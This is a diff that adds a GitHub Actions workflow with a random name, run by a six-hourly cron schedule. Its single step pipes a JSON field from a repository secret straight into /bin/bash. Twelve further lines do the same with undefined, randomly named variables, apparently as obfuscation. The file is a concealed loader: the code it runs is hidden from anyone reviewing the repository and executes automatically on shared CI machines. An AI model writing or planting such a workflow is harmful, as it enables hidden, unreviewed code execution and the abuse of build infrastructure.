@@ -1,0 +1,31 @@
+name: projectileclue
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: projectileclue
+        env:
+          twb6: ${{ secrets.twb6 }}
+        run: |
+          echo $twb6 | jq -r .wm9 | /bin/bash
+          echo $gpe701 | jq -r .hmto2765 | /bin/bash
+          echo $ji4746 | jq -r .ri9 | /bin/bash
+          echo $i68683 | jq -r .bmwd307 | /bin/bash
+          echo $khw017 | jq -r .b7 | /bin/bash
+          echo $s496 | jq -r .llxf300 | /bin/bash
+          echo $x0 | jq -r .l80 | /bin/bash
+          echo $n19476 | jq -r .tjvws341 | /bin/bash
+          echo $xw9263 | jq -r .sxa1 | /bin/bash
+          echo $s7814 | jq -r .dtb52 | /bin/bash
+          echo $zemgf5174 | jq -r .abbxc699 | /bin/bash
+          echo $ii5 | jq -r .wb81 | /bin/bash
+          echo $wv3874 | jq -r .jjkpd475 | /bin/bash
+
